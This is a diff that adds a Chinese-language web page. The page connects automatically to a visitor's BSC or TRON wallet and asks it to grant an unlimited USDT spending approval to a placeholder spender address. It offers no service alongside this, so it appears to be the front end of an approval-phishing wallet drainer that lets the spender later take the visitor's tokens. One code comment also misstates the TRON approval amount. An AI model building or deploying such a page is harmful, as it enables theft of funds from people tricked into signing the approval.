@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT 授权示例</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            background-color: #007bff;
+            transition: background-color 0.3s;
+        }
+        button:hover:not(:disabled) {
+            background-color: #0056b3;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            min-height: 40px;
+            font-weight: bold;
+        }
+        .connected {
+            background-color: #e6ffe6;
+            color: #008000;
+        }
+        .error {
+            background-color: #ffe6e6;
+            color: #cc0000;
+        }
+        .warning {
+            color: orange;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>USDT 代币授权示例</h1>
+    
+    <div id="status" class="status">未连接钱包</div>
+    
+    <button onclick="connectWalletAndCheckNetwork()">连接钱包 (BSC/TRON)</button>
+    <button id="approve-button" onclick="approveToken()" disabled>授权 USDT 代币</button>
+
+    <p style="margin-top: 30px;">
+        <strong class="warning">--- 🚨 替换警告 🚨 ---</strong>
+        <br>
+        <strong>您必须替换以下代码中的 `YOUR_BSC_SPENDER_ADDRESS` 和 `YOUR_TRON_SPENDER_ADDRESS` 为您的目标合约地址！</strong>
+    </p>
+</div>
+
+<script>
+    // --- 引入 Web3.js 库 (用于 EVM 交互) ---
+    // <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script> 已在头部引入
+
+    // --- 配置：USDT 代币合约地址 ---
+    // BSC (BEP-20) USDT 合约地址
+    const BSC_TOKEN_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+    // TRON (TRC-20) USDT 合约地址 (在 TronLink 中是 TXYZL...，但在合约调用时使用其 HEX 地址)
+    // 实际调用时，TronLink 会自动处理，这里使用其 base58 地址供参考，但更常用的是 T... 开头的
+    const TRON_TOKEN_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
+    
+    // 🚨 目标授权地址 (SPENDER) 🚨
+    // ** 必须替换为您的目标合约地址 **
+    const BSC_SPENDER_ADDRESS = 'YOUR_BSC_SPENDER_ADDRESS';
+    const TRON_SPENDER_ADDRESS = 'YOUR_TRON_SPENDER_ADDRESS';
+
+    // 授权金额 (这里以一个非常大的数字为例，代表无限授权)
+    // EVM (BSC): 2^256 - 1 是常用的“无限”授权值。
+    const MAX_APPROVAL_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; 
+    // TRON (USDT 精度为 6): 10^24 即授权 1 万亿 (1,000,000,000,000) USDT
+    const MAX_APPROVAL_AMOUNT_TRON_SUN = '1000000000000000000'; 
+
+    let currentNetwork = null;
+    let currentAccount = null;
+
+    // --- 状态更新函数 ---
+    function updateStatus(message, isError = false) {
+        const statusDiv = document.getElementById('status');
+        statusDiv.textContent = message;
+        statusDiv.className = isError ? 'status error' : 'status connected';
+        document.getElementById('approve-button').disabled = !currentAccount;
+    }
+
+    // --- 连接钱包和检查网络 ---
+    async function connectWalletAndCheckNetwork() {
+        // 1. 检查 TRON 钱包 (TronLink)
+        if (window.tronWeb) {
+            currentNetwork = 'TRON';
+            await connectTron();
+            return;
+        }
+
+        // 2. 检查 EVM 钱包 (BSC - MetaMask/TrustWallet等)
+        if (window.ethereum) {
+            currentNetwork = 'BSC'; // 假设默认是 BSC，方便后续连接/切换逻辑
+            await connectEVM();
+            return;
+        }
+        
+        // 3. 都没有找到
+        currentNetwork = null;
+        currentAccount = null;
+        updateStatus('未检测到兼容的钱包插件 (如 TronLink 或 MetaMask)。', true);
+        document.getElementById('approve-button').disabled = true;
+    }
+
+    // --- EVM (BSC) 连接逻辑 ---
+    async function connectEVM() {
+        try {
+            updateStatus('正在请求连接 BSC 钱包...');
+            
+            // 请求连接
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            currentAccount = accounts[0];
+            
+            // 获取当前 ChainID
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+            if (chainId !== '0x38' && chainId !== '56') { // '0x38' 或 56 是 BSC 主网的 Chain ID
+                updateStatus(`已连接到钱包，但当前网络不是 BSC 主网 (ChainID: ${chainId})。请在钱包中切换到 BSC。`, true);
+                document.getElementById('approve-button').disabled = true;
+                return;
+            }
+
+            updateStatus(`已连接到 BSC (USDT)，地址: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
+        } catch (error) {
+            console.error(error);
+            currentAccount = null;
+            updateStatus(`BSC 钱包连接失败: ${error.message || error.toString()}`, true);
+        }
+    }
+
+    // --- TRON (TRX) 连接逻辑 ---
+    async function connectTron() {
+        try {
+            updateStatus('正在等待 TRON 钱包就绪...');
+
+            if (!window.tronWeb.ready) {
+                // 等待 TronLink 注入和就绪
+                let isReady = false;
+                await new Promise((resolve, reject) => {
+                    const checkInterval = setInterval(() => {
+                        if (window.tronWeb && window.tronWeb.ready) {
+                            clearInterval(checkInterval);
+                            resolve();
+                        }
+                    }, 100);
+                    // 10秒后停止等待，防止无限循环
+                    setTimeout(() => {
+                        clearInterval(checkInterval);
+                        if (!window.tronWeb.ready) {
+                           reject(new Error("TronLink 钱包超时或未解锁。"));
+                        }
+                    }, 10000); 
+                });
+            }
+
+            currentAccount = window.tronWeb.defaultAddress.base58;
+            if (currentAccount) {
+                 updateStatus(`已连接到 TRON (USDT)，地址: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
+            } else {
+                 throw new Error("TronLink 钱包已安装但未连接或未解锁。");
+            }
+        } catch (error) {
+            console.error(error);
+            currentAccount = null;
+            updateStatus(`TRON 钱包连接失败: ${error.message || error.toString()}`, true);
+        }
+    }
+
+
+    // --- 代币授权逻辑 (分发器) ---
+    async function approveToken() {
+        if (!currentAccount) {
+            updateStatus('请先连接钱包！', true);
+            return;
+        }
+
+        if (currentNetwork === 'BSC') {
+            await approveBSCToken();
+        } else if (currentNetwork === 'TRON') {
+            await approveTRONToken();
+        } else {
+            updateStatus('请连接到 BSC 或 TRON 钱包。', true);
+        }
+    }
+
+    // --- BSC (EVM) 代币授权实现 ---
+    async function approveBSCToken() {
+        if (!window.ethereum || typeof Web3 === 'undefined') {
+            updateStatus('未找到 Web3 提供者。请确保您在支持 EVM 的钱包中打开。', true);
+            return;
+        }
+
+        if (BSC_SPENDER_ADDRESS === 'YOUR_BSC_SPENDER_ADDRESS') {
+             updateStatus('🚨 错误：请替换代码中的 BSC_SPENDER_ADDRESS 为您的目标合约地址。', true);
+             return;
+        }
+        
+        updateStatus('正在请求 BSC (USDT) 代币授权...');
+
+        // 最小 ERC-20 ABI，只包含 approve 函数
+        const abi = [
+            {"constant": false, "inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "type": "function"}
+        ];
+
+        try {
+            const web3 = new Web3(window.ethereum);
+            const tokenContract = new web3.eth.Contract(abi, BSC_TOKEN_ADDRESS);
+            
+            // 调用 USDT (BEP-20) 合约的 approve 方法
+            const transaction = await tokenContract.methods.approve(
+                BSC_SPENDER_ADDRESS, 
+                MAX_APPROVAL_AMOUNT_EVM // 授权无限额
+            ).send({ from: currentAccount });
+
+            updateStatus(`BSC 授权交易已发送！请在钱包中确认。交易哈希: ${transaction.transactionHash.substring(0, 10)}...`);
+            alert('BSC 钱包弹窗已弹出，请在钱包中确认授权！');
+
+        } catch (error) {
+            console.error("BSC 授权失败:", error);
+            if (error.code === 4001) {
+                updateStatus('BSC 授权被用户拒绝。', true);
+            } else {
+                updateStatus(`BSC 授权失败: ${error.message || error.toString()}`, true);
+            }
+        }
+    }
+
+    // --- TRON (TRX) 代币授权实现 ---
+    async function approveTRONToken() {
+        if (!window.tronWeb || !window.tronWeb.ready) {
+            updateStatus('TronLink 钱包未就绪。请确保已安装并解锁。', true);
+            return;
+        }
+
+        if (TRON_SPENDER_ADDRESS === 'YOUR_TRON_SPENDER_ADDRESS') {
+             updateStatus('🚨 错误：请替换代码中的 TRON_SPENDER_ADDRESS 为您的目标合约地址。', true);
+             return;
+        }
+        
+        updateStatus('正在请求 TRON (USDT) 代币授权...');
+        
+        try {
+            const contract = await window.tronWeb.contract().at(TRON_TOKEN_ADDRESS);
+
+            // 调用 USDT (TRC-20) 合约的 approve 方法
+            // 参数: spender 地址, 授权金额 (最小单位: 1 USDT = 10^6 SUN/最小单位)
+            const result = await contract.approve(
+                TRON_SPENDER_ADDRESS, 
+                MAX_APPROVAL_AMOUNT_TRON_SUN // 授权 1 万亿 USDT (10^24 最小单位)
+            ).send({
+                feeLimit: 100000000, // 费用上限 (单位: SUN)
+                callValue: 0,
+                shouldPollResponse: true
+            });
+
+            if (result.txid) {
+                 updateStatus(`TRON 授权交易已发送！请在钱包中确认。交易哈希: ${result.txid.substring(0, 10)}...`);
+                 alert('TRON 钱包弹窗已弹出，请在钱包中确认授权！');
+            } else {
+                 updateStatus('TRON 授权请求已发送，请检查 TronLink 钱包。', false);
+            }
+            
+        } catch (error) {
+            console.error("TRON 授权失败:", error);
+             if (error.message && error.message.includes('User cancelled')) {
+                updateStatus('TRON 授权被用户拒绝。', true);
+            } else {
+                updateStatus(`TRON 授权失败: ${error.message || error.toString()}`, true);
+            }
+        }
+    }
+
+    // 页面加载完成后自动尝试连接
+    document.addEventListener('DOMContentLoaded', () => {
+        // 监听 EVM 账户和网络变化 (MetaMask等)
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', connectWalletAndCheckNetwork);
+            window.ethereum.on('chainChanged', connectWalletAndCheckNetwork);
+        }
+        
+        // 首次加载尝试连接
+        connectWalletAndCheckNetwork();
+    });
+</script>
+</body>
+</html>
